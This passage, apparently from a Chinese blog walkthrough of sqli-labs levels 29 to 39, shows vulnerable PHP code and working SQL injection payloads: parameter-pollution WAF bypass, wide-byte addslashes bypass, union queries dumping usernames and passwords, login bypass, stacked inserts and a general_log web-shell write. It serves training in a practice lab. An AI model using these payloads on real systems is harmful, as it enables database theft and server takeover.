class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">if</span> æœ‰ç»“æœï¼š<br>    è¾“å‡º<br><span class="hljs-keyword">else</span>ï¼š<br>    è¾“å‡ºæŠ¥é”™ä¿¡æ¯<br><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€é¢˜å¤ªç®€å•äº†å§ï¼Œè”åˆæ³¨å…¥ Payload</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>--+<br><br></code></pre></td></tr></table></figure><p>login.php å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">// è·å–æŸ¥è¯¢çš„å­—ç¬¦ä¸²</span><br>$qs = $_SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><span class="hljs-comment">// æ¨¡æ‹ŸTomcatè¿›è¡Œä¸­é—´è¿‡æ»¤</span><br>$id1=java_implimentation($qs);<br>$id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br><span class="hljs-comment">// ç™½åå•</span><br>whitelist($id1);<br><br><span class="hljs-comment">// SQLè¯­å¥</span><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br><span class="hljs-comment">// WAF</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params">$input</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// æ£€æµ‹æ•°å­— ä»¥æ•°å­—å¼€å¤´ï¼Œä»¥æ•°å­—ç»“å°¾</span><br>    $match = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, $input);<br>    <span class="hljs-keyword">if</span>($match)<br>    &#123;<br>        <span class="hljs-comment">//echo &quot;you are good&quot;;</span><br>        <span class="hljs-comment">//return $match;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;    <br>        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br>        <span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// é™åˆ¶idçš„é•¿åº¦</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params">$query_string</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $q_s = $query_string;<br>    $qs_array= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,$q_s);<br><br><br>    <span class="hljs-keyword">foreach</span>($qs_array <span class="hljs-keyword">as</span> $key =&gt; $value)<br>    &#123;<br>        $val=substr($value,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span>($val==<span class="hljs-string">&quot;id&quot;</span>)<br>        &#123;<br>            $id_value=substr($value,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br>            <span class="hljs-keyword">return</span> $id_value;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åŒæ—¶ä¼ å…¥ä¸¤ä¸ª idï¼Œå½“å‰ä¸€ä¸ª id è¢« java_implimentation æ•è·çš„æ—¶å€™ï¼ˆæ¨¡æ‹Ÿ Tomcat çš„è§£æï¼‰ï¼Œç¬¬ä¸€ä¸ª id å°±ä¼šè¿›å…¥ WAFï¼Œå¦‚æœæ£€æµ‹åˆæ ¼åˆ™å°† GET å‚æ•°ä¸­çš„ id æ’å…¥ SQL è¯­å¥ï¼ˆç¬¬äºŒä¸ª idï¼Œè€Œä¸æ˜¯è¿›å…¥ WAFçš„ idï¼‰ã€‚æœ€åçš„ payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><ul><li>Apache PHP ä¼šè§£ææœ€åä¸€ä¸ªå‚æ•°</li><li>Tomcat JSP ä¼šè§£æç¬¬ä¸€ä¸ªå‚æ•°</li></ul><hr><h2 id="less-30-1"><a href="#less-30-1" class="headerlink" title="less-30"></a>less-30</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&quot;$id&quot;</code></p><p>åŒç¬¬29é¢˜ï¼Œä»…é—­åˆæ–¹å¼ä¸åŒã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># ç®€å•æµ‹è¯•ä¸€ä¸‹</span><br>?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span><span class="hljs-string">&quot; and sleep(3) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># è”åˆæ³¨å…¥</span><br><span class="hljs-string">?id=1&amp;id=0&quot;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">users</span>)--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=ï¼ˆ&quot;$id&quot;ï¼‰</code></p><p>åŒ29é¢˜ï¼Œä»…æ‹¼æ¥æ–¹å¼ä¸åŒã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># uninoæ³¨å…¥</span><br><span class="hljs-string">?id=1&amp;id=0&quot;)</span> <span class="hljs-string">union</span> <span class="hljs-string">select</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-number">3</span><span class="hljs-string">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&quot;$id&quot;</code></p><p>å…³é”®è¯ï¼šGETã€è”åˆæ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶æ³¨å…¥ã€ç»•è¿‡addslashes</p><p>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>$id=check_addslashes($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br><span class="hljs-comment"># åœ¨&#x27; &quot; \ ç­‰æ•æ„Ÿå­—ç¬¦å‰é¢æ·»åŠ åæ–œæ </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params">$string</span>)</span><br><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># \ è½¬æ¢ä¸º \\</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, $string); <br>     <span class="hljs-comment"># å°† &#x27; è½¬ä¸º\&quot;</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, $string);   <br>     <span class="hljs-comment"># å°† &quot; è½¬ä¸º\&quot;</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, $string);                                <br>    <span class="hljs-keyword">return</span> $string;<br>&#125;<br><br>mysqli_query($con1, <span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>å®½å­—èŠ‚æ³¨å…¥åŸç†ï¼š</p><ul><li>%dfåƒæ‰%5cï¼š&#39; è¿›è¡Œurlç¼–ç åä¸º%5c%27ï¼Œåœ¨%5c%27å‰æ·»åŠ %dfï¼Œå½“MySQLçš„ç¼–ç ä¸ºGBKæ—¶ï¼ˆmysqli_query($con1, â€œSET NAMES gbkâ€);ï¼‰ï¼Œ%df%5cä¼šè¢«ä½œä¸ºä¸€ä¸ªæ±‰å­—ï¼Œ%27ä½œä¸ºå•å¼•å·ç‹¬ç«‹ï¼Œå°±å¯ä»¥é€ƒè„±%5cï¼ˆ\ï¼‰çš„é™åˆ¶ã€‚</li><li>%5cåƒæ‰%5cï¼šå°†åæ–œæ ä½œä¸ºå­—ç¬¦ï¼Œç„¶åè®©%27ï¼ˆâ€™ï¼‰ä¸å—å‰é¢çš„%5cé™åˆ¶ã€‚ï¼ˆè¿™é‡Œæ— æ³•ä½¿ç”¨%5cï¼‰</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># ç®€å•æµ‹è¯•</span><br>?id=1%df&#x27; and sleep(3)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># æœ‰æ˜æ˜¾å»¶æ—¶</span><br>?id=1%5c&#x27; and sleep(3)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># æ²¡æœ‰å»¶æ—¶</span><br><br><span class="hljs-comment"># unionæ³¨å…¥</span><br>?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code><br>å…³é”®è¯ï¼šç»•è¿‡ addslashes</p><p>ç±»ä¼¼ä¸Šä¸€é¢˜ï¼Œä¸è¿‡é‡‡ç”¨ addslashes å‡½æ•°æ·»åŠ åæ–œæ ï¼ŒPayload åŒä¸Šä¸€é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params">$string</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $string= addslashes($string);    <br>    <span class="hljs-keyword">return</span> $string;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>addslasheså‡½æ•°è½¬ä¹‰çš„å­—ç¬¦</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex"><br><span class="hljs-tag">\<span class="hljs-name"> </span>  =</span>&gt;  <span class="hljs-tag">\<span class="hljs-name">\</span></span><br>&#x27;   =&gt;  <span class="hljs-tag">\<span class="hljs-name">&#x27;</span></span><br>&quot;   =&gt;  <span class="hljs-tag">\<span class="hljs-name">&quot;</span></span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=&#39;$uname&#39;</code></p><p>è¿‡æ»¤æ–¹æ³•åŒ less-33</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$uname = addslashes($uname1);<br>$passwd= addslashes($passwd1);<br><br></code></pre></td></tr></table></figure><p>å°è¯•æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># unionæ³¨å…¥</span><br>uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=233</span><br><br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨ UTF-16 æˆ– UTF-32ï¼Œæ•ˆæœåŒ<code>%df</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br>~ Â» <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27; | iconv -f utf-8 -t utf-16</span><br><span class="hljs-string">ï¿½ï¿½&#x27;</span><br>-------------------------------------------------------------<br>~ Â» <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27; | iconv -f utf-8 -t utf-32</span><br><span class="hljs-string">ï¿½ï¿½&#x27;</span><br><br></code></pre></td></tr></table></figure><p>æ„é€ ä¸‡èƒ½å¯†ç </p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br>uname=ï¿½&#x27; or 1<span class="hljs-comment">#&amp;passwd=</span><br><br></code></pre></td></tr></table></figure><p>åœ¨ MySQL ä¸­æ‰§è¡Œçš„ SQL è¯­å¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;ï¿½&#x27;</span> <span class="hljs-keyword">or</span> 1#<span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$passwd&#x27;</span> LIMIT 0,1<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¬¦å·çš„æ•ˆæœç±»ä¼¼äº %dfï¼Œè¿›è¡Œè”åˆæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>uname=ï¿½&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=$id</code></p><p>è¿™ä¸ªå…³å¡ä¸éœ€è¦ä½¿ç”¨å•å¼•å·å³å¯è¿›è¡Œæ³¨å…¥</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">security</span>.<span class="hljs-title">users</span>) --+</span><br><br></code></pre></td></tr></table></figure><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>å…³é”®è¯ï¼šç»•è¿‡ mysql_real_escape_string å‡½æ•°</p><p>mysql_real_escape_string å‡½æ•°ç±»ä¼¼ addslashes å‡½æ•°ï¼Œä¼šå¯¹åæ–œæ ã€å•å¼•å·ã€åŒå¼•å·è¿›è¡Œæ£€æµ‹å¹¶æ·»åŠ è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥æ–¹æ³•å’Œ less-34 ä¸€æ ·</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=-<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="hljs-string">?id=-1ï¿½&#x27;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">security</span>.<span class="hljs-title">users</span>) --+ </span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=&#39;$uname&#39;</code></p><p>å…³é”®è¯ï¼šç»•è¿‡ mysql_real_escape_string å‡½æ•°</p><p>åŒä¸Šä¸€é¢˜ï¼ŒGET æ–¹æ³•æ”¹ä¸º POST æ–¹æ³•ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">uname</span>=%df&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(username,password SEPARATOR <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) FROM users)#&amp;passwd=<br><span class="hljs-attribute">uname</span>=ï¿½&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(username,password SEPARATOR <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) FROM users)#&amp;passwd=<br><br></code></pre></td></tr></table></figure><hr><h1 id="4-å †å æ³¨å…¥-38-53"><a href="#4-å †å æ³¨å…¥-38-53" class="headerlink" title="4 å †å æ³¨å…¥(38-53)"></a>4 å †å æ³¨å…¥(38-53)</h1><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>æ·»åŠ å­—æ®µå€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ SQL è¯­å¥è¿›è¡ŒæŸ¥è¯¢æ˜¯å¦æ·»åŠ æˆåŠŸ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>select * <span class="hljs-keyword">from</span> users;<br><br></code></pre></td></tr></table></figure><h3 id="DNSLog-æ•°æ®å¤–å¸¦"><a href="#DNSLog-æ•°æ®å¤–å¸¦" class="headerlink" title="DNSLog æ•°æ®å¤–å¸¦"></a>DNSLog æ•°æ®å¤–å¸¦</h3><p>æ¡ä»¶ï¼š</p><ol><li>MySQL å¼€å¯ load_file()</li><li>DNSLog å¹³å° ï¼ˆHyugaã€CEYEï¼‰</li><li>Windows å¹³å°</li></ol><p>æ—  windows æš‚æ—¶ä¸æµ‹è¯•</p><h3 id="å¼€å¯æ—¥å¿—-Getshell"><a href="#å¼€å¯æ—¥å¿—-Getshell" class="headerlink" title="å¼€å¯æ—¥å¿— Getshell"></a>å¼€å¯æ—¥å¿— Getshell</h3><p>æ¡ä»¶ï¼š</p><ol><li>Web çš„ç‰©ç†è·¯å¾„</li><li>MySQL å¯ä»¥è¯»å†™ Web ç›®å½•</li><li>Windows æˆåŠŸç‡ é«˜äº Linux</li></ol><p>æŸ¥çœ‹æœ¬åœ°é…ç½®</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; show variables like <span class="hljs-emphasis">&#x27;general%&#x27;</span>;<br><span class="hljs-code">+------------------+</span>-----------------------------------------------------+<br>| Variable<span class="hljs-emphasis">_name    | Value                                               |</span><br><span class="hljs-emphasis">+------------------+-----------------------------------------------------+</span><br><span class="hljs-emphasis">| general_</span>log      | OFF                                                 |<br>| general<span class="hljs-emphasis">_log_</span>file | /Applications/MxSrvs/bin/mysql/data/MacBook-Pro.log |<br><span class="hljs-code">+------------------+</span>-----------------------------------------------------+<br>2 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>é»˜è®¤æ²¡æœ‰å¼€å¯ï¼Œå°è¯•æ‰‹åŠ¨å¼€å¯ï¼Œå¹¶é…ç½®ç›®å½•è·¯å¾„ï¼ˆæˆ‘çš„é¡¹ç›®è·¯å¾„ä¸ºï¼š/Users/littlechieh6/Documents/project/sqli-labs-php7ï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;</span>;<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥çœ‹é…ç½®</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; show variables like <span class="hljs-emphasis">&#x27;general%&#x27;</span>;<br><span class="hljs-code">+------------------+</span>----------------------------------------------------------------+<br>| Variable<span class="hljs-emphasis">_name    | Value                                                          |</span><br><span class="hljs-emphasis">+------------------+----------------------------------------------------------------+</span><br><span class="hljs-emphasis">| general_</span>log      | ON                                                             |<br>| general<span class="hljs-emphasis">_log_</span>file | /Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php |<br><span class="hljs-code">+------------------+</span>----------------------------------------------------------------+<br>2 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>å°è¯• Getshellï¼ˆè¿è¡Œçš„ sql è¯­å¥ä¼šè¢«ä¿å­˜åˆ°æˆ‘åˆšå¡«å†™çš„æ—¥å¿—è·¯å¾„ï¼Œæ—¥å¿—è·¯å¾„åˆåœ¨ web è·¯å¾„ä¹‹ä¸‹ï¼Œæ•…å¯ä»¥å¾—åˆ° web shellï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å– phpinfo ä¿¡æ¯ï¼ˆåŒç†å¯ä»¥å†™é©¬ï¼‰<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/6843E733-D786-4480-866B-5CF4A778449A.png"></p><h3 id="ä¿®æ”¹è¡¨åæŸ¥æ•°æ®"><a href="#ä¿®æ”¹è¡¨åæŸ¥æ•°æ®" class="headerlink" title="ä¿®æ”¹è¡¨åæŸ¥æ•°æ®"></a>ä¿®æ”¹è¡¨åæŸ¥æ•°æ®</h3><p>å…·ä½“ç»†èŠ‚æœç´¢ï¼šsupersqli é¢˜è§£ï¼ˆæ”»é˜²ä¸–ç•Œçš„é¢˜ç›®ï¼‰ã€‚</p><hr><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=$id</code></p><p>åŒ38ï¼Œé—­åˆæ–¹å¼ä¸åŒ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># æµ‹è¯•payload</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span 